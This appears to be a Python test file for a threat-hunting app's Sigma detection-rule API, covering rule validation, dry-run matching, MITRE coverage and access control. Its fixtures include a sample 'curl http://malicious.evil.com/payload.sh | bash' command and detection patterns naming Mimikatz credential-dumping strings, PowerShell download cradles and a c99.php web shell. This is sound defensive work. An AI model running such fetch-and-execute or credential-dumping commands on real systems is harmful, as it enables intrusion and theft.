import os
import sys
import unittest
from pathlib import Path
from unittest.mock import patch
import tempfile

BACKEND_ROOT = Path(__file__).resolve().parents[1]
SRC_ROOT = BACKEND_ROOT / "src"
if str(SRC_ROOT) not in sys.path:
    sys.path.insert(0, str(SRC_ROOT))

from th.webapp import app
from th import db as dbmod


class DetectionEngineeringTestCase(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()
        with app.app_context():
            dbmod.Base.metadata.create_all(bind=dbmod.engine)
            dbmod._initialize_database()
            dbmod.get_db()

        db = dbmod.SessionLocal()
        admin_user = db.query(dbmod.User).filter_by(role="admin").first()
        self.admin_token = dbmod.issue_token(db, admin_user)

        viewer_user = db.query(dbmod.User).filter_by(role="viewer").first()
        self.viewer_token = dbmod.issue_token(db, viewer_user)
        db.close()

    def test_list_sigma_rules(self):
        """Test listing active detection rules from hunting_rules.yml."""
        resp = self.client.get("/api/sigma/rules")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertEqual(data.get("status"), "ok")
        self.assertGreater(data.get("count", 0), 5)

        rules = data.get("rules", [])
        first = rules[0]
        self.assertIn("id", first)
        self.assertIn("description", first)
        self.assertIn("severity", first)
        self.assertIn("tactic", first)

    def test_validate_valid_sigma_rule(self):
        """Test validating a proper Sigma YAML rule."""
        sigma_yaml = """
title: Suspicious PowerShell Download Cradle
id: 5698b671-3cb5-460c-8d19-e4a0ec6a53cb
status: test
description: Detects suspicious PowerShell commands downloading content from web
tags:
    - attack.execution
    - attack.t1059.001
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        process: powershell.exe
        commandline:
            - DownloadString
            - WebClient
    condition: selection
"""
        resp = self.client.post("/api/sigma/rules/validate", json={"yaml": sigma_yaml})
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data.get("valid"))
        self.assertEqual(data.get("format"), "sigma")
        self.assertGreater(data.get("rule_count", 0), 0)

    def test_validate_invalid_yaml(self):
        """Test validating corrupt YAML syntax."""
        corrupt_yaml = """
title: Broken Rule
detection:
  bad_indent: [
"""
        resp = self.client.post("/api/sigma/rules/validate", json={"yaml": corrupt_yaml})
        self.assertEqual(resp.status_code, 400)
        data = resp.get_json()
        self.assertFalse(data.get("valid"))
        self.assertTrue(len(data.get("errors", [])) > 0)

    def test_validate_missing_detection_section(self):
        """Test validating YAML with missing detection section."""
        incomplete_yaml = """
title: Incomplete Rule
level: medium
"""
        resp = self.client.post("/api/sigma/rules/validate", json={"yaml": incomplete_yaml})
        self.assertEqual(resp.status_code, 400)
        data = resp.get_json()
        self.assertFalse(data.get("valid"))

    def test_dry_run_rule_matching(self):
        """Test stateless dry run test of a rule against a matching event."""
        rule_yaml = """
title: Suspicious Curl Execution
id: test_curl_exec
level: high
tags:
    - attack.execution
    - attack.t1059
detection:
    selection:
        commandline:
            - "curl http"
            - "wget http"
    condition: selection
"""
        matching_event = {
            "host": "DEV-SRV-02",
            "process": "bash",
            "commandline": "curl http://malicious.evil.com/payload.sh | bash",
            "user": "root",
        }
        resp = self.client.post("/api/sigma/rules/test", json={
            "yaml": rule_yaml,
            "sample_event": matching_event,
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data.get("matched"))
        self.assertEqual(data.get("match_count"), 1)
        self.assertIn("execution_time_ms", data)
        self.assertEqual(data["matches"][0]["rule_id"], "sigma_test_curl_exec_selection")

    def test_dry_run_rule_non_matching(self):
        """Test stateless dry run test of a rule against a non-matching event."""
        rule_yaml = """
title: Mimikatz Execution
id: test_mimikatz
level: critical
tags:
    - attack.credential_access
    - attack.t1003
detection:
    selection:
        commandline:
            - "sekurlsa::logonpasswords"
            - "lsadump::sam"
    condition: selection
"""
        benign_event = {
            "host": "WORKSTATION-01",
            "process": "calc.exe",
            "commandline": "C:\\Windows\\system32\\calc.exe",
            "user": "alice",
        }
        resp = self.client.post("/api/sigma/rules/test", json={
            "yaml": rule_yaml,
            "sample_event": benign_event,
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertFalse(data.get("matched"))
        self.assertEqual(data.get("match_count"), 0)

    def test_mitre_matrix_coverage(self):
        """Test MITRE ATT&CK enterprise matrix coverage computation."""
        resp = self.client.get("/api/sigma/mitre-matrix")
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertEqual(data.get("status"), "ok")

        summary = data.get("summary", {})
        self.assertEqual(summary.get("total_tactics"), 12)
        self.assertGreater(summary.get("covered_tactics", 0), 0)
        self.assertGreater(summary.get("total_techniques", 0), 20)
        self.assertGreater(summary.get("coverage_percentage", 0), 0.0)

        tactics = data.get("tactics", [])
        self.assertEqual(len(tactics), 12)

        # Verify Execution tactic has T1059.001 covered by hunting_rules.yml
        execution = next((t for t in tactics if t["tactic_name"] == "Execution"), None)
        self.assertIsNotNone(execution)
        self.assertTrue(execution["covered"])
        ps_tech = next((tech for tech in execution["techniques"] if tech["id"] == "T1059.001"), None)
        self.assertIsNotNone(ps_tech)
        self.assertTrue(ps_tech["covered"])
        self.assertGreater(ps_tech["rule_count"], 0)

    def test_save_rule_rbac(self):
        """Test that saving a rule requires analyst/admin and rejects viewer."""
        rule_yaml = """
title: Custom Web Shell
id: custom_web_shell
level: critical
tags:
    - attack.persistence
    - attack.t1505.003
detection:
    selection:
        commandline:
            - "whoami"
            - "c99.php"
    condition: selection
"""
        # Anonymous attempt -> 403
        resp_anon = self.client.post("/api/sigma/rules/save", json={"yaml": rule_yaml})
        self.assertEqual(resp_anon.status_code, 403)

        # Viewer attempt -> 403
        resp_viewer = self.client.post(
            "/api/sigma/rules/save",
            headers={"Authorization": f"Bearer {self.viewer_token}"},
            json={"yaml": rule_yaml},
        )
        self.assertEqual(resp_viewer.status_code, 403)

        # Admin attempt -> 200
        with tempfile.TemporaryDirectory() as tmpdir:
            temp_custom_rules = Path(tmpdir) / "custom_rules.yml"
            with patch("th.rules_api.CUSTOM_RULES_FILE", temp_custom_rules):
                resp_admin = self.client.post(
                    "/api/sigma/rules/save",
                    headers={"Authorization": f"Bearer {self.admin_token}"},
                    json={"yaml": rule_yaml},
                )
                self.assertEqual(resp_admin.status_code, 200)
                res_data = resp_admin.get_json()
                self.assertEqual(res_data.get("status"), "ok")
                self.assertTrue(temp_custom_rules.exists())


if __name__ == "__main__":
    unittest.main()
